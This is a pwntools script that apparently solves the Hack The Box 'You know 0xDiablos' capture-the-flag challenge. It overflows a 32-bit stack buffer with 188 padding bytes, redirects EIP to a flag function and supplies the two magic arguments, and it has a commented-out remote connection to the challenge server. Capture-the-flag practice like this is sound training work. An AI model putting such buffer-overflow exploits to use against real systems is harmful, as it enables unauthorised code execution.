from pwn import *
import struct

level = "you know 0xdiablos"
ip = "144.126.234.64:30137"
os.chdir("/home/ayush/Work/HackTheBox/Challenges/PWN/"+level)
print(os.getcwd())

context.update(arch="i386", os="linux")
binary = ELF("./vuln")

#generating the payload 
padding = b"A"*188 
eip = struct.pack("I", 0x080491e2)
return_after_call = struct.pack("I", 0x11111111)
arg1 = struct.pack("I", 0xdeadbeef)
arg2 = struct.pack("I", 0xc0ded00d)
payload = padding+eip+return_after_call+arg1+arg2

#this is how we can generate payload with pwntools
#payload = padding + p32(binary.symbols['flag'], endian="little") + p32(0x90909090) + p32(0xdeadbeef, endian="little") + p32(0xc0ded00d, endian="little")

r = binary.process()
#r = remote(ip.split(':')[0], ip.split(':')[1])
log.info("Sending payload...")
r.sendlineafter(b':', payload)
r.interactive()


